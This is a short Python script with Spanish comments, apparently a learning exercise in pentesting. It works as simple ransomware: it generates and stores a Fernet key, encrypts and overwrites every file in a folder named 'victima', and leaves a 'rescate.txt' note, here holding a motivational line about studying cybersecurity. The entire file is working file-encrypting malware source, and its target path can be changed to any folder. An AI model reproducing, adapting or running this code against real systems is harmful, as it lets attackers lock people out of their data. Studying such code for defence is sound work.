from cryptography.fernet import Fernet
import os 

# Genero la clave de cifrado
def generate_key():
    # Cro la clave
    key = Fernet.generate_key()
    # Creo un archivo donde se va a almacenar la clave
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

# Leo, en modo binario,  el archivo de cifrado creado y devuelvo en cadena de bytes.
def load_key():
    return open('key.key', 'rb').read()

# Encripto la informacion
def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        # Verifico que el elemento se un archivo
        if os.path.isfile(item):
            # Por cada archivo leo la informacion en modo binario
            with open(item, 'rb') as file:
                file_data = file.read()
            # utilizo la clave para cifrar los datos
            encrypt_data = f.encrypt(file_data)
            # Sobreescribo el archivo original con datos cifrados
            with open(item, 'wb') as file:
                file.write(encrypt_data)



if __name__ == '__main__':
    # Ubicacion del archivo a cifrar
    path_to_encrypt = 'C:\\Developer\\Pentest\\victima'
    # Creo la lista
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+ '\\'+ item for item in items]

    generate_key()
    key = load_key()
    # Llamo la funcion pasando la lista de archivos y la calve d ecifrado
    encrypt(full_path, key)

    with open(os.path.join(path_to_encrypt,'rescate.txt'), 'w') as file:
        file.write("Me merezco trabajar en ciberseguridad\n ")
        file.write("y por eso voy a estudiar hasta conseguirlo\n ")



# Bibliotecas:
    # Cryptography: Cifrado y descifrado de datos usando algoritmos de datos,
        # en este caso, simetricos a Fernet.
    # Os: Permite realizar operaciones con el sistema operativo, como manipulacion
        # de archivos y directorios.